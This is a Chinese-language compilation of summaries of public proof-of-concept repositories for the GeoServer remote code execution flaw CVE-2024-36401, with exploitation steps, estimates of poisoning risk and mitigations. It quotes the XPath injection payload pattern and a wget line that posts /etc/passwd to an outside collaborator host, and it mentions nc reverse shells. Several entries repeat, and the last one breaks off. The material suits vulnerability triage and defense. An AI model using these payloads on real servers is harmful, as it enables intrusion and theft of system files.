**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #16

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

